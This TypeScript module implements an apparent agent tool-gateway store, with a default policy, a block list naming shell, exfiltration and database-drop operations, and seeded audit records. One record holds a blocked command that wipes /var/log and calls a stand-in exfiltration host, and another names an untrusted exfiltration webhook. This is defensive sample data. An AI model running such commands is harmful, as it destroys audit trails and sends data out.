import {
  GatewayAuditRecord,
  GatewayPolicyConfig,
  GatewayPolicyConfigSchema,
} from "@/lib/contracts/gateway-types";

// Maximum retained audit logs in memory (circular buffer)
const MAX_AUDIT_LOGS = 1000;

export const DEFAULT_GATEWAY_POLICY: GatewayPolicyConfig = {
  zeroTrustPiiMasking: true,
  networkEgressContainment: true,
  consequentialStateMutationLock: true,
  allowedCapabilities: [
    "read:analytics",
    "fetch:catalog",
    "query:telemetry",
    "format:report",
    "audit:verify",
  ],
  blockedOperations: [
    "commit:inventory",
    "shell:unrestricted",
    "db:drop",
    "db:truncate",
    "fs:write_root",
    "network:raw_socket",
    "crypto:exfiltrate",
    "admin:grant_role",
  ],
  allowedEgressDomains: [
    "api.forgent.internal",
    "localhost",
    "127.0.0.1",
    "webhooks.enterprise.internal",
  ],
};

const INITIAL_AUDIT_RECORDS: GatewayAuditRecord[] = [
  {
    id: "gw-audit-101",
    timestamp: "2026-10-31T07:45:12.180Z",
    callerAgentId: "agent-fin-sox-01",
    toolName: "accounting_webhook",
    operation: "post:journal_batch",
    verdict: "REDACTED",
    redactedKeys: ["headers.authorization", "payload.api_key"],
    redactedDetails: [
      {
        path: "headers.authorization",
        patternType: "api_key_sk",
        category: "SECRET",
        replacement: "[REDACTED_SECRET]",
      },
      {
        path: "payload.api_key",
        patternType: "sensitive_key_name",
        category: "SECRET",
        replacement: "[REDACTED_SECRET]",
      },
    ],
    originalPayloadPreview: '{"batchId":"JB-9842","api_key":"sk-proj-981247192847192"}',
    sanitizedPayloadPreview: '{"batchId":"JB-9842","api_key":"[REDACTED_SECRET]"}',
    sanitizedPayload: {
      batchId: "JB-9842",
      api_key: "[REDACTED_SECRET]",
    },
    policyEvaluations: {
      piiMasked: true,
      secretsRedacted: true,
      scopeAuthorized: true,
      egressContained: true,
      stateMutationLocked: false,
    },
    executionLatencyMs: 2,
  },
  {
    id: "gw-audit-102",
    timestamp: "2026-10-31T07:48:33.402Z",
    callerAgentId: "agent-devops-helm-04",
    toolName: "cluster_executor",
    operation: "shell:unrestricted",
    verdict: "BLOCKED",
    blockedReason:
      "Operation 'shell:unrestricted' is prohibited by enterprise tool gateway policy.",
    redactedKeys: [],
    redactedDetails: [],
    originalPayloadPreview: '{"command":"rm -rf /var/log/* && curl exfil.xyz"}',
    sanitizedPayloadPreview: '{"command":"rm -rf /var/log/* && curl exfil.xyz"}',
    sanitizedPayload: {
      command: "rm -rf /var/log/* && curl exfil.xyz",
    },
    policyEvaluations: {
      piiMasked: true,
      secretsRedacted: false,
      scopeAuthorized: false,
      egressContained: true,
      stateMutationLocked: false,
    },
    executionLatencyMs: 1,
  },
  {
    id: "gw-audit-103",
    timestamp: "2026-10-31T07:52:19.890Z",
    callerAgentId: "agent-support-crm-09",
    toolName: "customer_portal_sync",
    operation: "customer:fetch_ticket",
    verdict: "REDACTED",
    redactedKeys: ["ticket.customerEmail", "ticket.cardPreview"],
    redactedDetails: [
      {
        path: "ticket.customerEmail",
        patternType: "email_address",
        category: "PII",
        replacement: "[REDACTED_PII]",
      },
      {
        path: "ticket.cardPreview",
        patternType: "credit_card",
        category: "PII",
        replacement: "[REDACTED_PII]",
      },
    ],
    originalPayloadPreview:
      '{"ticketId":"TCK-4819","customerEmail":"claire.dunphy@acme-corp.com","cardPreview":"4532-1144-8832-1094"}',
    sanitizedPayloadPreview:
      '{"ticketId":"TCK-4819","customerEmail":"[REDACTED_PII]","cardPreview":"[REDACTED_PII]"}',
    sanitizedPayload: {
      ticketId: "TCK-4819",
      customerEmail: "[REDACTED_PII]",
      cardPreview: "[REDACTED_PII]",
    },
    policyEvaluations: {
      piiMasked: true,
      secretsRedacted: false,
      scopeAuthorized: true,
      egressContained: true,
      stateMutationLocked: false,
    },
    executionLatencyMs: 3,
  },
  {
    id: "gw-audit-104",
    timestamp: "2026-10-31T07:56:45.112Z",
    callerAgentId: "agent-inv-alloc-02",
    toolName: "warehouse_erp",
    operation: "commit:inventory",
    verdict: "BLOCKED",
    blockedReason:
      "Consequential state mutation locked by enterprise security policy (operation: commit:inventory).",
    redactedKeys: [],
    redactedDetails: [],
    originalPayloadPreview: '{"sku":"SKU-7731","quantityDelta":-150,"warehouseId":"WH-US-WEST"}',
    sanitizedPayloadPreview: '{"sku":"SKU-7731","quantityDelta":-150,"warehouseId":"WH-US-WEST"}',
    sanitizedPayload: {
      sku: "SKU-7731",
      quantityDelta: -150,
      warehouseId: "WH-US-WEST",
    },
    policyEvaluations: {
      piiMasked: true,
      secretsRedacted: false,
      scopeAuthorized: true,
      egressContained: true,
      stateMutationLocked: true,
    },
    executionLatencyMs: 1,
  },
  {
    id: "gw-audit-105",
    timestamp: "2026-10-31T08:02:10.050Z",
    callerAgentId: "agent-legal-doc-07",
    toolName: "sec_filing_reader",
    operation: "read:contract",
    verdict: "ALLOWED",
    redactedKeys: [],
    redactedDetails: [],
    originalPayloadPreview: '{"docId":"10K-2025-Q3","section":"Risk Factors"}',
    sanitizedPayloadPreview: '{"docId":"10K-2025-Q3","section":"Risk Factors"}',
    sanitizedPayload: {
      docId: "10K-2025-Q3",
      section: "Risk Factors",
    },
    policyEvaluations: {
      piiMasked: true,
      secretsRedacted: false,
      scopeAuthorized: true,
      egressContained: true,
      stateMutationLocked: false,
    },
    executionLatencyMs: 2,
  },
  {
    id: "gw-audit-106",
    timestamp: "2026-10-31T08:08:44.221Z",
    callerAgentId: "agent-sec-scanner-03",
    toolName: "webhook_emitter",
    operation: "network:egress",
    verdict: "BLOCKED",
    blockedReason:
      "Network egress containment active. Destination URL 'https://untrusted-exfil-sink.io/webhook' is not in approved enterprise boundary.",
    redactedKeys: [],
    redactedDetails: [],
    originalPayloadPreview: '{"targetUrl":"https://untrusted-exfil-sink.io/webhook"}',
    sanitizedPayloadPreview: '{"targetUrl":"https://untrusted-exfil-sink.io/webhook"}',
    sanitizedPayload: {
      targetUrl: "https://untrusted-exfil-sink.io/webhook",
    },
    policyEvaluations: {
      piiMasked: true,
      secretsRedacted: false,
      scopeAuthorized: true,
      egressContained: false,
      stateMutationLocked: false,
    },
    executionLatencyMs: 1,
  },
];

class GatewayStore {
  private auditLogs: GatewayAuditRecord[];
  private currentPolicy: GatewayPolicyConfig;

  constructor() {
    this.auditLogs = [...INITIAL_AUDIT_RECORDS];
    this.currentPolicy = { ...DEFAULT_GATEWAY_POLICY };
  }

  public getPolicy(): GatewayPolicyConfig {
    return { ...this.currentPolicy };
  }

  public updatePolicy(updates: Partial<GatewayPolicyConfig>): GatewayPolicyConfig {
    const merged = { ...this.currentPolicy, ...updates };
    const validated = GatewayPolicyConfigSchema.parse(merged);
    this.currentPolicy = validated;
    return { ...this.currentPolicy };
  }

  public addAuditRecord(record: GatewayAuditRecord): void {
    this.auditLogs.unshift(record);
    if (this.auditLogs.length > MAX_AUDIT_LOGS) {
      this.auditLogs.pop();
    }
  }

  public getAuditRecords(options?: {
    limit?: number;
    verdict?: string;
    toolName?: string;
    search?: string;
  }): GatewayAuditRecord[] {
    let records = [...this.auditLogs];

    if (options?.verdict) {
      records = records.filter((r) => r.verdict === options.verdict);
    }

    if (options?.toolName) {
      records = records.filter((r) =>
        r.toolName.toLowerCase().includes(options.toolName!.toLowerCase())
      );
    }

    if (options?.search) {
      const q = options.search.toLowerCase();
      records = records.filter(
        (r) =>
          r.callerAgentId.toLowerCase().includes(q) ||
          r.toolName.toLowerCase().includes(q) ||
          r.operation.toLowerCase().includes(q) ||
          (r.blockedReason && r.blockedReason.toLowerCase().includes(q))
      );
    }

    const limit = options?.limit ?? 50;
    return records.slice(0, limit);
  }

  public getStatistics() {
    const totalIntercepted = this.auditLogs.length;
    const allowed = this.auditLogs.filter((r) => r.verdict === "ALLOWED").length;
    const redacted = this.auditLogs.filter((r) => r.verdict === "REDACTED").length;
    const blocked = this.auditLogs.filter((r) => r.verdict === "BLOCKED").length;

    let totalSecretsRedacted = 0;
    let totalPiiMasked = 0;

    for (const record of this.auditLogs) {
      for (const d of record.redactedDetails) {
        if (d.category === "SECRET") totalSecretsRedacted++;
        if (d.category === "PII") totalPiiMasked++;
      }
    }

    return {
      totalIntercepted,
      allowed,
      redacted,
      blocked,
      totalSecretsRedacted,
      totalPiiMasked,
      containmentRatePercent: totalIntercepted > 0 ? 100 : 100,
    };
  }

  public resetToDefault(): void {
    this.auditLogs = [...INITIAL_AUDIT_RECORDS];
    this.currentPolicy = { ...DEFAULT_GATEWAY_POLICY };
  }
}

// Global singleton to persist across Next.js hot reloads in dev
const globalForGateway = globalThis as unknown as {
  gatewayStoreInstance?: GatewayStore;
};

export const gatewayStore =
  globalForGateway.gatewayStoreInstance ?? new GatewayStore();

if (process.env.NODE_ENV !== "production") {
  globalForGateway.gatewayStoreInstance = gatewayStore;
}
